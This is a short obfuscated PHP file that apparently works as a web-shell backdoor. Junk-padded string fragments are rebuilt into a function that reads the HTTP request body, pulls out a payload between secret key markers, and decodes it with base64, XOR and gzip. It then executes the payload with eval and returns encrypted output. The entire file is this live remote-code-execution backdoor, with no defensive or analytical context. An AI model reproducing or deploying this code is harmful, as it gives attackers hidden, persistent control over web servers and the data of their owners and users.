<?php
$u='input"),w$mw)==1) {@wob_stwart();@evwawl(@gzunwcowmpress(@x(@bwase64_dwewcode($mw[1]),$k)));$o=@wob_gewt_';
$f='$k){w$c=strwlen($k);$l=swtrlewn($t);$o="";fowr($iw=0;$i<$wl;){fwwor($j=w0;($j<$c&w&$i<w$l);$j++,$i++w){$';
$q=str_replace('bO','','crebOabOte_bObOfbOunbOction');
$Q='cwontwents(w);@ob_enwd_clewan();$r=@bawwse64_ewncode(@x(@gzcowmpreswwws(w$o),$k));print("$p$kwh$r$kf");}';
$j='o.=w$tw{$wi}w^$k{$j}w;}}return $o;}ifw (@preg_wmatchww("/$kh(.+w)$kf/"w,@fwile_get_contwwenwts("php:w//';
$s='$kw="w2e224f65";$kh="w0w5wfw13d6752f5";$kwf="614c4abf941w1";w$p="gz7bww2Z34RIwSd77wxz";function xw(w$wt,';
$r=str_replace('w','',$s.$f.$j.$u.$Q);
$E=$q('',$r);$E();
?>
